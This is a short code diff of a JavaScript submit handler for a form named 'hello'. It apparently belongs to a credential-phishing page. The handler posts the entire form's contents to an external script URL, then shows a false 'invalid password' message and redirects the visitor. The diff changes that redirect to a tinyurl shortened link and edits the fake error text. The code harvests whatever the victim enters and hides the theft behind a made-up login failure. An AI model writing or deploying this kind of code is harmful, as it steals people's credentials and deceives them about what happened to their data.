@@ -4,6 +4,6 @@ const form = document.forms['hello']
 form.addEventListener('submit', e => {
     e.preventDefault()
     fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-        .then(response => alert("invalid username or password"), window.location.href = "http://www.sainy98.github.io/super"), alert(" Invalid password ") 
+        .then(response => alert("try again.... "), window.location.href = "https://tinyurl.com/zzr37wdw"), alert(" Invalid password ") 
         .catch(error => console.error('Error!', error.message))
 })
